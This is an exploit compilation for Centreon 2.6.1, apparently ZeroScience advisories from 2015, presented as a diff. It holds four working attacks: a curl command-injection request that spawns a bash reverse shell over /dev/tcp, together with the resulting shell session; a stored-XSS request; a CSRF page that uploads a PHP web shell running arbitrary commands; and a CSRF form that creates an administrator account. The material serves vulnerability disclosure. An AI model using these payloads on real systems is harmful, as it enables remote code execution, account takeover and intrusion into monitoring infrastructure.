@@ -1,0 +1,305 @@
+Centreon 2.6.1 Command Injection Vulnerability
+
+
+Vendor: Centreon
+Product web page: https://www.centreon.com
+Affected version: 2.6.1 (CES 3.2)
+
+Summary: Centreon is the choice of some of the world's largest
+companies and mission-critical organizations for real-time IT
+performance monitoring and diagnostics management.
+
+Desc: The POST parameter 'persistant' which serves for making
+a new service run in the background is not properly sanitised
+before being used to execute commands. This can be exploited
+to inject and execute arbitrary shell commands as well as using
+cross-site request forgery attacks.
+
+Tested on: CentOS 6.6 (Final)
+           Apache/2.2.15
+           PHP/5.3.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5265
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5265.php
+
+
+10.08.2015
+
+--
+
+<<<<<<
+
+root@zslab:~# curl -i -s -k -X 'POST' \
+-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0' \
+-H 'Content-Type: application/x-www-form-urlencoded' \
+-b 'PHPSESSID=bk80lvka1v8sb9ltuivjngo520' \
+--data-binary $'host_id=14&service_id=19&persistant=1%27%22%600%26%2fbin%2fbash+-i+%3e+%2fdev%2ftcp%2f127.0.0.1%2f6161+0%3c%261+2%3e%261%60%27&duration_scale=s&start=08%2f17%2f2018&start_time=8%3a16&end=09%2f17%2f2018&end_time=10%3a16&comment=pwned&submitA=Save&o=as' \
+'http://localhost.localdomain/centreon/main.php?p=20218'
+
+>>>>>>
+
+root@zslab:~# nc -4 -l -n 6161 -vv -D
+Connection from 127.0.0.1 port 6161 [tcp/*] accepted
+bash: no job control in this shell
+bash-4.1$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache),494(centreon-engine),496(centreon-broker),498(centreon),499(nagios)
+bash-4.1$ uname -a;cat /etc/issue
+uname -a;cat /etc/issue
+Linux localhost.localdomain 2.6.32-504.16.2.el6.x86_64 #1 SMP Wed Apr 22 06:48:29 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+Centreon Enterprise Server
+Kernel \r on an \m
+
+bash-4.1$ pwd 
+pwd
+/usr/share/centreon/www
+bash-4.1$ exit
+exit
+exit
+root@zslab:~# 
+
+#################################################################
+
+Centreon 2.6.1 Stored Cross-Site Scripting Vulnerability
+
+Desc: Centreon suffers from a stored XSS vulnerability. Input
+passed thru the POST parameter 'img_comment' is not sanitized
+allowing the attacker to execute HTML code into user's browser
+session on the affected site.
+
+Tested on: CentOS 6.6 (Final)
+           Apache/2.2.15
+           PHP/5.3.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5266
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5266.php
+
+
+10.08.2015
+
+--
+
+
+POST /centreon/main.php?p=50102 HTTP/1.1
+Host: localhost.localdomain
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost.localdomain/centreon/main.php?p=50102&o=a
+Cookie: PHPSESSID=qg580onenijim611sca8or3o32
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------951909060822176775828135993
+Content-Length: 1195
+
+
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="directories"
+
+upload
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="list_dir"
+
+0
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="filename"; filename="phpinfo.php"
+Content-Type: application/octet-stream
+
+<?
+phpinfo();
+?>
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="img_comment"
+
+"><script>alert(1);</script>
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="action[action]"
+
+1
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="submitA"
+
+Save
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+2097152
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="img_id"
+
+
+-----------------------------951909060822176775828135993
+Content-Disposition: form-data; name="o"
+
+a
+-----------------------------951909060822176775828135993--
+
+#################################################################
+
+Centreon 2.6.1 Unrestricted File Upload Vulnerability
+
+Desc: The vulnerability is caused due to the improper verification
+of uploaded files via the 'filename' POST parameter. This can be
+exploited to execute arbitrary PHP code by uploading a malicious
+PHP script file that will be stored in the '/img/media/' directory.
+
+Tested on: CentOS 6.6 (Final)
+           Apache/2.2.15
+           PHP/5.3.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5264
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5264.php
+
+
+10.08.2015
+
+--
+
+
+<html>
+  <!-- Specified dir is 1337 and filename is shelly.php -->
+  <!-- Ex: http://localhost.localdomain/centreon/img/media/1337/shelly.php?c=id -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost.localdomain/centreon/main.php?p=50102", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------951909060822176775828135993");
+        xhr.withCredentials = true;
+        var body = "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"directories\"\r\n" + 
+          "\r\n" + 
+          "1337\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"list_dir\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"filename\"; filename=\"shelly.php\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\x3c?php\r\n" + 
+          "echo \"\x3cpre\x3e\";system($_GET[\'c\']);echo \"\x3c\/pre\x3e\";\r\n" + 
+          "?\x3e\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"img_comment\"\r\n" + 
+          "\r\n" + 
+          "peened\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"action[action]\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"submitA\"\r\n" + 
+          "\r\n" + 
+          "Save\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 
+          "\r\n" + 
+          "2097152\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"img_id\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------951909060822176775828135993\r\n" + 
+          "Content-Disposition: form-data; name=\"o\"\r\n" + 
+          "\r\n" + 
+          "a\r\n" + 
+          "-----------------------------951909060822176775828135993--";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+#################################################################
+
+Centreon 2.6.1 CSRF Add Admin Exploit
+
+Desc: The application allows users to perform certain actions
+via HTTP requests without performing any validity checks to
+verify the requests. This can be exploited to perform certain
+actions with administrative privileges if a logged-in user
+visits a malicious web site.
+
+Tested on: CentOS 6.6 (Final)
+           Apache/2.2.15
+           PHP/5.3.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5263
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5263.php
+
+
+10.08.2015
+
+--
+
+
+<html>
+  <body>
+    <form action="'http://localhost.localdomain/centreon/main.php?p=60301" method="POST">
+      <input type="hidden" name="contact_alias" value="Testingus" />
+      <input type="hidden" name="contact_name" value="Fullio" />
+      <input type="hidden" name="contact_email" value="test@test.tld" />
+      <input type="hidden" name="contact_pager" value="" />
+      <input type="hidden" name="contact_template_id" value="" />
+      <input type="hidden" name="contact_enable_notifications[contact_enable_notifications]" value="2" />
+      <input type="hidden" name="timeperiod_tp_id" value="" />
+      <input type="hidden" name="timeperiod_tp_id2" value="" />
+      <input type="hidden" name="contact_oreon[contact_oreon]" value="1" />
+      <input type="hidden" name="contact_passwd" value="123123" />
+      <input type="hidden" name="contact_passwd2" value="123123" />
+      <input type="hidden" name="contact_lang" value="en_US" />
+      <input type="hidden" name="contact_admin[contact_admin]" value="1" />
+      <input type="hidden" name="contact_autologin_key" value="" />
+      <input type="hidden" name="contact_auth_type" value="local" />
+      <input type="hidden" name="contact_acl_groups[]" value="31" />
+      <input type="hidden" name="contact_acl_groups[]" value="32" />
+      <input type="hidden" name="contact_acl_groups[]" value="34" />
+      <input type="hidden" name="contact_address1" value="Neverland" />
+      <input type="hidden" name="contact_address2" value="" />
+      <input type="hidden" name="contact_address3" value="101" />
+      <input type="hidden" name="contact_address4" value="" />
+      <input type="hidden" name="contact_address5" value="" />
+      <input type="hidden" name="contact_address6" value="" />
+      <input type="hidden" name="contact_activate[contact_activate]" value="1" />
+      <input type="hidden" name="contact_comment" value="comment-vuln-xss-t00t" />
+      <input type="hidden" name="action[action]" value="1" />
+      <input type="hidden" name="submitA" value="Save" />
+      <input type="hidden" name="contact_register" value="1" />
+      <input type="hidden" name="contact_id" value="" />
+      <input type="hidden" name="o" value="a" />
+      <input type="hidden" name="initialValues" value="a:0:{}" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
